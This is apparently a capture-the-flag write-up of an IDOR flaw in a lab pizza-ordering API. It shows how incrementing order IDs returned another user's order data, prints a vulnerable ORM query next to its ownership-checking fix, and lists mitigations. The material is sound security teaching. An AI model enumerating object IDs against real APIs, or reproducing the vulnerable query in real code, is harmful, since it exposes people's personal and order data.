---
title: "IDOR via Sequential Order IDs | Cheesy Does It"
date: 2026-05-11 12:05:00 +0530
categories: [Web Security, Broken Access Control]
tags: [idor, broken-access-control, authorization-bypass, api-security, horizontal-privilege-escalation, bugforge]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/cheesy-does-it-bac.webp
  alt: Cheesy Does It IDOR order disclosure walkthrough
---

# Cheesy Does It

Cheesy Does It is a pizza ordering application exposing an API for cart management and order tracking. During testing, the order retrieval endpoint was found to use predictable sequential identifiers without enforcing proper authorization checks.

By manipulating the order ID in API requests, it became possible to access orders belonging to other users, resulting in an Insecure Direct Object Reference (IDOR) vulnerability.

---

# Overview

The application allowed authenticated users to:

- Create orders
- View order details
- Track purchases through the API

Order information was retrieved using:

```http
GET /api/orders/{id}
```

Testing revealed that order IDs were sequential and globally accessible.

The application failed to verify whether the authenticated user actually owned the requested order.

---

# Objective

- Analyze order functionality
- Identify predictable object references
- Test authorization enforcement
- Access another user's order
- Retrieve sensitive order data and the flag

---

# Initial Account Testing

Two separate user accounts were created to test authorization boundaries.

---

# Creating Orders

Using the first account, pizzas were added to the cart and an order was placed.

## Request

```http
POST /api/orders
```

The created order could then be retrieved using:

```http
GET /api/orders/1
```

A second order was created:

```http
POST /api/orders
```

and became accessible at:

```http
GET /api/orders/2
```

At this point, the order IDs appeared sequential.

---

# Hypothesis

Because order identifiers incremented numerically:

```text
1
2
3
4
...
```

the application likely relied solely on the provided ID without verifying ownership.

This strongly suggested a potential IDOR vulnerability.

---

# Cross-Account Testing

A second account was created.

Using this account:

- A pizza was added to the cart
- A new order was submitted

## Request

```http
POST /api/orders
```

The newly created order became order ID `3`.

---

# Exploitation

While authenticated as the first user, the following request was sent:

```http
GET /api/orders/3
```

Despite belonging to another account, the server returned the full order details.

---

# Proof of Vulnerability

## Response

```json
{
  "id":3,
  "user_id":5,
  "order_number":"CDI-1778511784605-Q2PTDB468",
  "total_price":12.99,
  "status":"received",
  "delivery_address":"hstn",
  "phone":"5756",
  "payment_method":"card",
  "notes":"",
  "created_at":"2026-05-11 15:03:04",
  "updated_at":"2026-05-11 15:03:04",
  "items":[
    {
      "id":3,
      "order_id":3,
      "pizza_name":"Pepperoni Classic",
      "base_name":"Hand Tossed",
      "sauce_name":"Classic Tomato",
      "size":"Medium",
      "quantity":1,
      "unit_price":12.99,
      "total_price":12.99,
      "toppings":"Extra Mozzarella, Pepperoni"
    }
  ],
  "flag":"bug{....}"
}
```

This confirmed that:

- Orders were globally enumerable
- Authorization checks were missing
- Any authenticated user could access other users' orders
- Sensitive customer data was exposed

---

# Vulnerability Type

This issue is classified as:

## Insecure Direct Object Reference (IDOR)

More specifically:

## Broken Object Level Authorization (BOLA)

The application trusted user-supplied object identifiers without verifying ownership.

---

# Root Cause Analysis

The backend likely queried orders directly using the supplied ID:

```python
Order.query.get(order_id)
```

instead of enforcing ownership:

```python
Order.query.filter_by(
    id=order_id,
    user_id=current_user.id
).first()
```

Because authorization validation was missing, any authenticated user could enumerate and access arbitrary orders.

---

# Impact

This vulnerability could allow attackers to:

- View other users' orders
- Access personal information
- Leak addresses and phone numbers
- Enumerate customer activity
- Access payment-related metadata
- Harvest sensitive business data

In real-world applications, similar flaws may expose:

- Full customer profiles
- Order histories
- Billing details
- Internal invoices
- API secrets or tokens accidentally embedded in responses

---

# Exploitation Flow

## Step 1 — Create an Order

```http
POST /api/orders
```

---

## Step 2 — Observe Sequential IDs

```text
/api/orders/1
/api/orders/2
```

---

## Step 3 — Create Another Account

Generate a new order from a separate account.

---

## Step 4 — Access Foreign Order

```http
GET /api/orders/3
```

---

## Step 5 — Retrieve Sensitive Data

The API returns another user's order contents and the flag.

---

# Mitigation

## Enforce Ownership Validation

Every object access must verify ownership server-side.

### Vulnerable

```python
order = Order.query.get(order_id)
```

### Secure

```python
order = Order.query.filter_by(
    id=order_id,
    user_id=current_user.id
).first()
```

---

## Use Indirect References

Avoid exposing predictable sequential IDs.

Prefer:

- UUIDs
- Randomized identifiers
- Opaque references

---

## Implement Authorization Middleware

Centralize access-control enforcement for all sensitive endpoints.

---

## Log Authorization Failures

Track suspicious enumeration attempts such as:

```text
/orders/1
/orders/2
/orders/3
/orders/4
```

---

# Real-World Insight

IDOR vulnerabilities remain one of the most common API security issues.

Modern applications often implement authentication correctly but fail authorization checks after login.

Developers frequently assume:

> "If the user is authenticated, they can access the object."

instead of verifying:

> "Does this specific user own this specific object?"

This distinction is critical.

APIs exposing sequential numeric IDs are especially vulnerable because attackers can easily automate enumeration.

---

# Key Takeaways

- Authentication does not equal authorization
- Sequential IDs often indicate potential IDOR issues
- APIs must validate ownership on every request
- Sensitive business logic should never trust client-supplied object references
- Broken Object Level Authorization is a major API security risk
